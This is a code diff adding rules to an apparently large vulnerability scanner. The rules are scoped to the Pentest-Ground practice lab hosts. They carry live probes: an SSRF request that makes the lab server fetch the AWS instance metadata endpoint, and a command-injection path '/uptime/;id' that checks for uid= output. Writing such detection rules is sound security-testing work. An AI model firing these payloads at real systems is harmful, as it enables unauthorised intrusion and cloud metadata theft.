@@ -36006,6 +36006,62 @@ const clientSidePentestGroundGuardianLeaksEvidence: Rule = async (ctx) => {
   };
 };
 
+function isPentestGroundGuardianLeaksHost(ctx: RuleContext): boolean {
+  const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
+  return /pentest-ground\.com:81/i.test(corpus);
+}
+
+function pentestGroundGuardianLeaksProbeOrigin(ctx: RuleContext): string {
+  if (isPentestGroundGuardianLeaksHost(ctx)) return "https://pentest-ground.com:81";
+  return ctx.origin;
+}
+
+const pentestGroundGuardianLeaksCreateSsrfLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundGuardianLeaksHost(ctx)) return NEGATIVE;
+  const createUrl = new URL("/create", pentestGroundGuardianLeaksProbeOrigin(ctx)).toString();
+  const referenceUrl = "http://169.254.169.254/latest/meta-data/";
+  const doc = await ctx.probe.get(createUrl, {
+    method: "POST",
+    body: `title=ThugirSsrfProbe&content=probe&reference=${encodeURIComponent(referenceUrl)}`,
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    maxBytes: 65536,
+    timeoutMs: 20000
+  });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const metadataOk =
+    /ami-id/i.test(doc.body) &&
+    (/instance-id/i.test(doc.body) || /instance-type/i.test(doc.body));
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: createUrl,
+      referenceUrl,
+      snippet:
+        doc.body.match(/ami-id[\s\S]{0,120}/i)?.[0]?.slice(0, 200) || doc.body.slice(0, 200),
+      note: "Pentest-Ground GuardianLeaks POST /create reference= fetches AWS IMDS metadata (ami-id, instance-id) — SSRF via blog reference field oracle"
+    }
+  };
+};
+
+const pentestGroundGuardianLeaksCreateSsrfRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundGuardianLeaksHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/create\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await pentestGroundGuardianLeaksCreateSsrfLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pentest-Ground GuardianLeaks /create route scan — POST reference= fetches AWS IMDS metadata — SSRF route oracle"
+    }
+  };
+};
+
 // --- Pentest-Ground vulnerable lab catalog hub (pentest-ground.com) -------------------
 const CLIENT_PENTEST_GROUND_HUB_RES: { label: string; re: RegExp }[] = [
   {
@@ -37886,6 +37942,40 @@ const pentestGroundRestflawSearchXxeRouteLiveOracle: Rule = async (ctx) => {
       searchUrl,
       snippet: doc.body.slice(0, 240).trim(),
       note: "Pentest-Ground RestFlaw POST /search with billion-laughs XML entity expansion triggers parser error — XXE route oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawUptimeCmdiLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const uptimeUrl = new URL("/uptime/;id", pentestGroundRestflawProbeOrigin(ctx)).toString();
+  const doc = await ctx.probe.get(uptimeUrl, { maxBytes: 4096, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  if (!/uid=\d+\([^)]+\)/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: uptimeUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "Pentest-Ground RestFlaw GET /uptime/;id shells out to uptime -;id and returns uid= — OS command injection oracle"
+    }
+  };
+};
+
+const pentestGroundRestflawUptimeCmdiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPentestGroundRestflawHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/pentest-ground\.com:9000/i.test(pageUrl)) return NEGATIVE;
+  const result = await pentestGroundRestflawUptimeCmdiLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: {
+      ...result.evidence,
+      scannedUrl: pageUrl,
+      note: "Pentest-Ground RestFlaw route scan — GET /uptime/;id returns uid= via shell metacharacters — command injection route oracle"
     }
   };
 };
@@ -65829,6 +65919,8 @@ export const RULES: Record<string, Rule> = {
   clientSideMindApiEvidence,
   clientSideHermesCodexEvidence,
   clientSidePentestGroundGuardianLeaksEvidence,
+  pentestGroundGuardianLeaksCreateSsrfLiveOracle,
+  pentestGroundGuardianLeaksCreateSsrfRouteLiveOracle,
   clientSidePentestGroundHubEvidence,
   pentestGroundDvwaExecCmdiRouteLiveOracle,
   pentestGroundDvwaCspBypassRouteLiveOracle,
@@ -65891,6 +65983,8 @@ export const RULES: Record<string, Rule> = {
   pentestGroundRestflawTokensSqliRouteLiveOracle,
   pentestGroundRestflawTokensSqliErrorRouteLiveOracle,
   pentestGroundRestflawSearchXxeRouteLiveOracle,
+  pentestGroundRestflawUptimeCmdiLiveOracle,
+  pentestGroundRestflawUptimeCmdiRouteLiveOracle,
   clientSideJudgementDayArenaEvidence,
   clientSideCahyodVulnerableLabEvidence,
   clientSideCtfchallengeEvidence,
